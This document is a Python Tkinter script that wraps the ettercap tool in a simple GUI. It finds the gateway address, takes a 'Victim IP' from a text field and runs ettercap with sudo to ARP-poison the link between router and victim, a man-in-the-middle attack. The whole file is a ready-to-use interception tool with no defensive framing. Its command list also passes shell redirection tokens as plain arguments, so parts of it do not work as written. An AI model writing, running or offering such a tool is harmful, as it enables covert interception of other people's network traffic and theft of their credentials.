import tkinter as tk
from tkinter import messagebox
import socket
import subprocess

def get_local_ip():
    try:
        # Create a socket to get the local machine's IP address
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 1))  # Connect to a public DNS server
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception as e:
        print(f"Error getting local IP address: {e}")
        return None

def get_router_ip():
    try:
        # Run a subprocess to get the default gateway (router) IP address
        result = subprocess.check_output(["ip", "route", "show", "default"]).decode("utf-8")
        router_ip = result.split()[2]
        return router_ip
    except Exception as e:
        print(f"Error getting router IP address: {e}")
        return None

def execute_ettercap(victim_ip):
    router_ip = get_router_ip()
    router_path = f"/{router_ip}//"
    victim_path = f"/{victim_ip}//"
    command = ["sudo", "ettercap", "-T", "-q", "-M", "arp:remote", router_path, victim_path, ">", "/dev/null", "2>&1", "&"]

    try:
        result = subprocess.run(command, check=True)
        messagebox.showinfo("Success", "ettercap command executed successfully.")
    except subprocess.CalledProcessError as e:
        messagebox.showerror("Error", f"Error executing ettercap command: {e}")

# Create the main window
window = tk.Tk()
window.title("Ettercap GUI")

# Get local and router IPs
local_ip = get_local_ip()
router_ip = get_router_ip()

if local_ip:
    local_ip_label = tk.Label(window, text=f"Local IP address: {local_ip}")
    local_ip_label.pack()

if router_ip:
    router_ip_label = tk.Label(window, text=f"Router IP address: {router_ip}")
    router_ip_label.pack()

# Create entry for victim IP
victim_ip_label = tk.Label(window, text="Enter Victim IP:")
victim_ip_label.pack()

entry = tk.Entry(window)
entry.pack()

# Create button to execute ettercap
button = tk.Button(window, text="Execute Ettercap", command=lambda: execute_ettercap(entry.get()))
button.pack()

# Run the Tkinter event loop
window.mainloop()
